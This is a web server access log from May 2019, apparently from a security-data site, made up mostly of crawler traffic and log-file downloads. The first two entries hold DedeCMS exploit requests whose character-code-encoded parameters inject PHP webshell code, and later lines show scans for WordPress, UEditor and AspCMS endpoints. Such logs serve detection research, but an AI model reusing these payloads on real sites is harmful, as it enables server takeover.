115.217.238.12 - - [16/May/2019:19:14:25 -0700] "GET /plus/mytag_js.php?dopost=saveedit&arrs1%5B%5D=99&arrs1%5B%5D=102&arrs1%5B%5D=103&arrs1%5B%5D=95&arrs1%5B%5D=100&arrs1%5B%5D=98&arrs1%5B%5D=112&arrs1%5B%5D=114&arrs1%5B%5D=101&arrs1%5B%5D=102&arrs1%5B%5D=105&arrs1%5B%5D=120&arrs2%5B%5D=109&arrs2%5B%5D=121&arrs2%5B%5D=116&arrs2%5B%5D=97&arrs2%5B%5D=103&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=40&arrs2%5B%5D=97&arrs2%5B%5D=105&arrs2%5B%5D=100&arrs2%5B%5D=44&arrs2%5B%5D=110&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=109&arrs2%5B%5D=98&arrs2%5B%5D=111&arrs2%5B%5D=100&arrs2%5B%5D=121&arrs2%5B%5D=41&arrs2%5B%5D=32&arrs2%5B%5D=86&arrs2%5B%5D=65&arrs2%5B%5D=76&arrs2%5B%5D=85&arrs2%5B%5D=69&arrs2%5B%5D=83&arrs2%5B%5D=40&arrs2%5B%5D=57&arrs2%5B%5D=48&arrs2%5B%5D=57&arrs2%5B%5D=48&arrs2%5B%5D=44&arrs2%5B%5D=39&arrs2%5B%5D=60&arrs2%5B%5D=63&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=32&arrs2%5B%5D=101&arrs2%5B%5D=99&arrs2%5B%5D=104&arrs2%5B%5D=111&arrs2%5B%5D=32&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=100&arrs2%5B%5D=101&arrs2%5B%5D=100&arrs2%5B%5D=101&arrs2%5B%5D=99&arrs2%5B%5D=109&arrs2%5B%5D=115&arrs2%5B%5D=32&arrs2%5B%5D=53&arrs2%5B%5D=46&arrs2%5B%5D=55&arrs2%5B%5D=32&arrs2%5B%5D=48&arrs2%5B%5D=100&arrs2%5B%5D=97&arrs2%5B%5D=121&arrs2%5B%5D=60&arrs2%5B%5D=98&arrs2%5B%5D=114&arrs2%5B%5D=62&arrs2%5B%5D=103&arrs2%5B%5D=117&arrs2%5B%5D=105&arrs2%5B%5D=103&arrs2%5B%5D=101&arrs2%5B%5D=44&arrs2%5B%5D=32&arrs2%5B%5D=57&arrs2%5B%5D=48&arrs2%5B%5D=115&arrs2%5B%5D=101&arrs2%5B%5D=99&arrs2%5B%5D=46&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=103&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=59&arrs2%5B%5D=64&arrs2%5B%5D=112&arrs2%5B%5D=114&arrs2%5B%5D=101&arrs2%5B%5D=103&arrs2%5B%5D=95&arrs2%5B%5D=114&arrs2%5B%5D=101&arrs2%5B%5D=112&arrs2%5B%5D=108&arrs2%5B%5D=97&arrs2%5B%5D=99&arrs2%5B%5D=101&arrs2%5B%5D=40&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=47&arrs2%5B%5D=91&arrs2%5B%5D=99&arrs2%5B%5D=111&arrs2%5B%5D=112&arrs2%5B%5D=121&arrs2%5B%5D=114&arrs2%5B%5D=105&arrs2%5B%5D=103&arrs2%5B%5D=104&arrs2%5B%5D=116&arrs2%5B%5D=93&arrs2%5B%5D=47&arrs2%5B%5D=101&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=44&arrs2%5B%5D=36&arrs2%5B%5D=95&arrs2%5B%5D=82&arrs2%5B%5D=69&arrs2%5B%5D=81&arrs2%5B%5D=85&arrs2%5B%5D=69&arrs2%5B%5D=83&arrs2%5B%5D=84&arrs2%5B%5D=91&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=103&arrs2%5B%5D=117&arrs2%5B%5D=105&arrs2%5B%5D=103&arrs2%5B%5D=101&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=93&arrs2%5B%5D=44&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=101&arrs2%5B%5D=114&arrs2%5B%5D=114&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=41&arrs2%5B%5D=59&arrs2%5B%5D=63&arrs2%5B%5D=62&arrs2%5B%5D=39&arrs2%5B%5D=41&arrs2%5B%5D=59&arrs2%5B%5D=0 HTTP/1.1" 404 294 "http://www.secrepo.com/plus/mytag_js.php?dopost=saveedit&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=116&arrs2[]=97&arrs2[]=103&arrs2[]=96&arrs2[]=32&arrs2[]=40&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=44&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=41&arrs2[]=32&arrs2[]=86&arrs2[]=65&arrs2[]=76&arrs2[]=85&arrs2[]=69&arrs2[]=83&arrs2[]=40&arrs2[]=57&arrs2[]=48&arrs2[]=57&arrs2[]=48&arrs2[]=44&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=99&arrs2[]=104&arrs2[]=111&arrs2[]=32&arrs2[]=39&arrs2[]=39&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=99&arrs2[]=109&arrs2[]=115&arrs2[]=32&arrs2[]=53&arrs2[]=46&arrs2[]=55&arrs2[]=32&arrs2[]=48&arrs2[]=100&arrs2[]=97&arrs2[]=121&arrs2[]=60&arrs2[]=98&arrs2[]=114&arrs2[]=62&arrs2[]=103&arrs2[]=117&arrs2[]=105&arrs2[]=103&arrs2[]=101&arrs2[]=44&arrs2[]=32&arrs2[]=57&arrs2[]=48&arrs2[]=115&arrs2[]=101&arrs2[]=99&arrs2[]=46&arrs2[]=111&arrs2[]=114&arrs2[]=103&arrs2[]=39&arrs2[]=39&arrs2[]=59&arrs2[]=64&arrs2[]=112&arrs2[]=114&arrs2[]=101&arrs2[]=103&arrs2[]=95&arrs2[]=114&arrs2[]=101&arrs2[]=112&arrs2[]=108&arrs2[]=97&arrs2[]=99&arrs2[]=101&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=47&arrs2[]=91&arrs2[]=99&arrs2[]=111&arrs2[]=112&arrs2[]=121&arrs2[]=114&arrs2[]=105&arrs2[]=103&arrs2[]=104&arrs2[]=116&arrs2[]=93&arrs2[]=47&arrs2[]=101&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=36&arrs2[]=95&arrs2[]=82&arrs2[]=69&arrs2[]=81&arrs2[]=85&arrs2[]=69&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=39&arrs2[]=39&arrs2[]=103&arrs2[]=117&arrs2[]=105&arrs2[]=103&arrs2[]=101&arrs2[]=39&arrs2[]=39&arrs2[]=93&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=101&arrs2[]=114&arrs2[]=114&arrs2[]=111&arrs2[]=114&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=0" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
115.217.238.12 - - [16/May/2019:19:14:25 -0700] "GET /plus/download.php?open=1&arrs1%5B%5D=99&arrs1%5B%5D=102&arrs1%5B%5D=103&arrs1%5B%5D=95&arrs1%5B%5D=100&arrs1%5B%5D=98&arrs1%5B%5D=112&arrs1%5B%5D=114&arrs1%5B%5D=101&arrs1%5B%5D=102&arrs1%5B%5D=105&arrs1%5B%5D=120&arrs2%5B%5D=109&arrs2%5B%5D=121&arrs2%5B%5D=97&arrs2%5B%5D=100&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=83&arrs2%5B%5D=69&arrs2%5B%5D=84&arrs2%5B%5D=32&arrs2%5B%5D=96&arrs2%5B%5D=110&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=109&arrs2%5B%5D=98&arrs2%5B%5D=111&arrs2%5B%5D=100&arrs2%5B%5D=121&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=61&arrs2%5B%5D=32&arrs2%5B%5D=39&arrs2%5B%5D=60&arrs2%5B%5D=63&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=32&arrs2%5B%5D=102&arrs2%5B%5D=105&arrs2%5B%5D=108&arrs2%5B%5D=101&arrs2%5B%5D=95&arrs2%5B%5D=112&arrs2%5B%5D=117&arrs2%5B%5D=116&arrs2%5B%5D=95&arrs2%5B%5D=99&arrs2%5B%5D=111&arrs2%5B%5D=110&arrs2%5B%5D=116&arrs2%5B%5D=101&arrs2%5B%5D=110&arrs2%5B%5D=116&arrs2%5B%5D=115&arrs2%5B%5D=40&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=109&arrs2%5B%5D=111&arrs2%5B%5D=111&arrs2%5B%5D=110&arrs2%5B%5D=46&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=44&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=60&arrs2%5B%5D=63&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=32&arrs2%5B%5D=101&arrs2%5B%5D=118&arrs2%5B%5D=97&arrs2%5B%5D=108&arrs2%5B%5D=40&ar HTTP/1.1" 418 731 "http://www.secrepo.com/plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=97&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=96&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=32&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=109&arrs2[]=111&arrs2[]=111&arrs2[]=110&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&ar" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
115.217.238.12 - - [16/May/2019:19:14:26 -0700] "POST /admin_aspcms/_system/AspCms_SiteSetting.asp HTTP/1.1" 404 295 "http://www.secrepo.com/admin_aspcms/_system/AspCms_SiteSetting.asp" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
115.217.238.12 - - [16/May/2019:19:14:26 -0700] "POST /e/DoInfo/ecms.php HTTP/1.1" 404 294 "http://www.secrepo.com/e/DoInfo/ecms.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
207.46.13.242 - - [16/May/2019:19:21:00 -0700] "GET /self.logs/2016/access.log.2016-01-31.gz HTTP/1.1" 200 5811 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
40.77.167.40 - - [16/May/2019:19:24:01 -0700] "GET /self.logs/access.log.2018-07-07.gz HTTP/1.1" 200 72965 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
40.77.167.86 - - [16/May/2019:19:26:02 -0700] "GET /self.logs/access.log.2017-06-08.gz HTTP/1.1" 200 19778 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
14.215.176.16 - - [16/May/2019:19:27:49 -0700] "GET / HTTP/1.1" 301 483 "http://www.baidu.com/s?wd=visitsfn" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0" 
14.215.176.11 - - [16/May/2019:19:27:51 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0" 
40.77.167.86 - - [16/May/2019:19:28:35 -0700] "GET /self.logs/error.log.2017-11-18.gz HTTP/1.1" 200 1249 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
40.77.167.86 - - [16/May/2019:19:29:03 -0700] "GET /self.logs/access.log.2018-10-16.gz HTTP/1.1" 200 18996 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
13.66.139.0 - - [16/May/2019:19:29:30 -0700] "GET /self.logs/access.log.2019-04-05.gz HTTP/1.1" 304 189 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
52.212.146.96 - - [16/May/2019:19:30:01 -0700] "GET /self.logs/access.log.2019-05-10.gz HTTP/1.1" 200 29782 "-" "python-requests/2.12.1" 
52.212.146.96 - - [16/May/2019:19:30:01 -0700] "GET /self.logs/access.log.2019-05-11.gz HTTP/1.1" 200 21572 "-" "python-requests/2.12.1" 
52.212.146.96 - - [16/May/2019:19:30:02 -0700] "GET /self.logs/access.log.2019-05-12.gz HTTP/1.1" 200 24393 "-" "python-requests/2.12.1" 
52.212.146.96 - - [16/May/2019:19:30:02 -0700] "GET /self.logs/access.log.2019-05-13.gz HTTP/1.1" 200 29041 "-" "python-requests/2.12.1" 
52.212.146.96 - - [16/May/2019:19:30:02 -0700] "GET /self.logs/access.log.2019-05-14.gz HTTP/1.1" 404 340 "-" "python-requests/2.12.1" 
52.212.146.96 - - [16/May/2019:19:30:03 -0700] "GET /self.logs/access.log.2019-05-15.gz HTTP/1.1" 404 340 "-" "python-requests/2.12.1" 
52.212.146.96 - - [16/May/2019:19:30:03 -0700] "GET /self.logs/access.log.2019-05-16.gz HTTP/1.1" 404 340 "-" "python-requests/2.12.1" 
207.46.13.242 - - [16/May/2019:19:31:58 -0700] "GET /self.logs/2016/access.log.2016-08-22.gz HTTP/1.1" 200 8867 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
42.236.10.125 - - [16/May/2019:19:33:51 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1" 
66.249.64.190 - - [16/May/2019:19:34:01 -0700] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
119.28.186.31 - - [16/May/2019:19:36:15 -0700] "GET /favicon.ico HTTP/1.1" 200 231 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3676.400 QQBrowser/10.4.3469.400" 
113.171.224.176 - - [16/May/2019:19:36:18 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
207.46.13.242 - - [16/May/2019:19:37:36 -0700] "GET /self.logs/2016/access.log.2016-12-28.gz HTTP/1.1" 200 28379 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
40.77.167.40 - - [16/May/2019:19:42:53 -0700] "GET /self.logs/2015/error.log.2015-09-05.gz HTTP/1.1" 200 654 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
169.57.0.241 - - [16/May/2019:19:46:55 -0700] "GET / HTTP/1.0" 200 46413 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.84 Safari/537.36" 
66.249.64.47 - - [16/May/2019:20:04:44 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
207.46.13.136 - - [16/May/2019:20:05:37 -0700] "GET /self.logs/error.log.2018-03-15.gz HTTP/1.1" 200 4553 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
14.215.176.144 - - [16/May/2019:20:05:58 -0700] "GET / HTTP/1.1" 200 12511 "http://www.baidu.com/s?wd=wetnyg" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0" 
40.77.167.103 - - [16/May/2019:20:08:50 -0700] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
103.204.83.2 - - [16/May/2019:20:10:23 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
78.131.58.83 - - [16/May/2019:20:10:24 -0700] "GET /honeypot/Honey HTTP/1.0" 404 303 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.1 Safari/605.1.15" 
110.74.193.236 - - [16/May/2019:20:10:56 -0700] "GET /honeypot/Honey HTTP/1.0" 404 303 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.1 Safari/605.1.15" 
40.77.167.40 - - [16/May/2019:20:11:09 -0700] "GET /self.logs/error.log.2017-10-02.gz HTTP/1.1" 301 544 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
40.77.167.103 - - [16/May/2019:20:11:56 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
103.86.51.247 - - [16/May/2019:20:12:25 -0700] "GET /user/register/ HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9) Gecko/2008052906 Firefox/3.0" 
103.86.51.247 - - [16/May/2019:20:12:26 -0700] "GET / HTTP/1.1" 200 46413 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9) Gecko/2008052906 Firefox/3.0" 
159.226.95.71 - - [16/May/2019:20:17:42 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko)" 
159.226.95.71 - - [16/May/2019:20:17:43 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 340 "-" "Safari%20%E6%B5%8F%E8%A7%88%E5%99%A8/13607.1.40.1.5 CFNetwork/902.3.1 Darwin/17.7.0 (x86_64)" 
159.226.95.71 - - [16/May/2019:20:17:43 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 339 "-" "Safari%20%E6%B5%8F%E8%A7%88%E5%99%A8/13607.1.40.1.5 CFNetwork/902.3.1 Darwin/17.7.0 (x86_64)" 
159.226.95.71 - - [16/May/2019:20:17:43 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Safari%20%E6%B5%8F%E8%A7%88%E5%99%A8/13607.1.40.1.5 CFNetwork/902.3.1 Darwin/17.7.0 (x86_64)" 
159.226.95.71 - - [16/May/2019:20:17:44 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1" 
159.226.95.71 - - [16/May/2019:20:17:45 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 339 "-" "Safari%20%E6%B5%8F%E8%A7%88%E5%99%A8/13607.1.40.1.5 CFNetwork/902.3.1 Darwin/17.7.0 (x86_64)" 
159.226.95.71 - - [16/May/2019:20:17:45 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 339 "-" "Safari%20%E6%B5%8F%E8%A7%88%E5%99%A8/13607.1.40.1.5 CFNetwork/902.3.1 Darwin/17.7.0 (x86_64)" 
159.226.95.71 - - [16/May/2019:20:17:45 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Safari%20%E6%B5%8F%E8%A7%88%E5%99%A8/13607.1.40.1.5 CFNetwork/902.3.1 Darwin/17.7.0 (x86_64)" 
40.77.167.40 - - [16/May/2019:20:20:45 -0700] "GET /self.logs/2015/error.log.2015-05-10.gz HTTP/1.1" 200 1011 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.136 - - [16/May/2019:20:24:22 -0700] "GET /self.logs/access.log.2018-04-04.gz HTTP/1.1" 304 189 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.136 - - [16/May/2019:20:28:58 -0700] "GET /self.logs/access.log.2018-08-11.gz HTTP/1.1" 200 17849 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
41.223.160.131 - - [16/May/2019:20:32:06 -0700] "GET /maccdc2012/dns.log.gz HTTP/1.1" 304 154 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
206.47.249.246 - - [16/May/2019:20:32:54 -0700] "GET /self.logs/error.log.2019-04-23.gz HTTP/1.1" 304 189 "-" "Mozilla/4.0 (compatible;)" 
207.46.13.242 - - [16/May/2019:20:35:47 -0700] "GET /self.logs/error.log.2017-08-05.gz HTTP/1.1" 200 977 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
41.223.160.131 - - [16/May/2019:20:36:42 -0700] "GET /tg/tg_snort_fast.7z HTTP/1.1" 304 131 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
207.46.13.242 - - [16/May/2019:20:40:20 -0700] "GET /self.logs/2016/error.log.2016-05-12.gz HTTP/1.1" 200 1029 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
113.171.224.176 - - [16/May/2019:20:41:55 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
207.46.13.136 - - [16/May/2019:20:43:25 -0700] "GET /self.logs/error.log.2018-03-01.gz HTTP/1.1" 301 544 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
40.77.167.40 - - [16/May/2019:20:51:17 -0700] "GET /self.logs/2015/error.log.2015-07-25.gz HTTP/1.1" 200 622 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.136 - - [16/May/2019:21:02:23 -0700] "GET /self.logs/error.log.2017-07-04.gz HTTP/1.1" 200 864 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
162.210.196.129 - - [16/May/2019:21:22:58 -0700] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
162.210.196.129 - - [16/May/2019:21:23:01 -0700] "GET / HTTP/1.1" 200 46368 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
165.225.110.208 - - [16/May/2019:21:23:58 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" 
103.86.51.247 - - [16/May/2019:21:24:12 -0700] "GET /user/register/ HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9) Gecko/2008052906 Firefox/3.0" 
103.86.51.247 - - [16/May/2019:21:24:13 -0700] "GET / HTTP/1.1" 200 46413 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9) Gecko/2008052906 Firefox/3.0" 
207.46.13.136 - - [16/May/2019:21:26:30 -0700] "GET /self.logs/access.log.2017-10-09.gz HTTP/1.1" 304 189 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.136 - - [16/May/2019:21:36:02 -0700] "GET /self.logs/error.log.2018-03-15.gz HTTP/1.1" 200 4553 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
42.236.99.58 - - [16/May/2019:21:36:34 -0700] "GET /robots.txt HTTP/1.1" 301 502 "http://secrepo.com/robots.txt" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider" 
42.236.99.58 - - [16/May/2019:21:36:34 -0700] "GET /robots.txt HTTP/1.1" 200 334 "http://www.secrepo.com/robots.txt" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider" 
42.236.99.58 - - [16/May/2019:21:36:35 -0700] "GET /robots.txt HTTP/1.1" 200 334 "http://www.secrepo.com/robots.txt" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider" 
69.117.4.189 - - [16/May/2019:21:37:48 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
69.117.4.189 - - [16/May/2019:21:37:48 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
182.76.175.118 - - [16/May/2019:21:38:45 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36" 
182.76.175.118 - - [16/May/2019:21:38:45 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36" 
182.76.175.118 - - [16/May/2019:21:38:46 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36" 
182.76.175.118 - - [16/May/2019:21:38:47 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36" 
114.115.203.130 - - [16/May/2019:21:39:49 -0700] "GET /ueditor/php/imageUp.php HTTP/1.1" 404 295 "http://www.secrepo.com/ueditor/php/imageUp.php" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)" 
40.77.167.103 - - [16/May/2019:21:41:06 -0700] "GET /self.logs/error.log.2017-10-13.gz HTTP/1.1" 200 1743 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
113.171.224.176 - - [16/May/2019:21:43:47 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
42.236.10.84 - - [16/May/2019:21:47:44 -0700] "GET /auth.log/auth.log.gz HTTP/1.1" 200 554524 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36" 
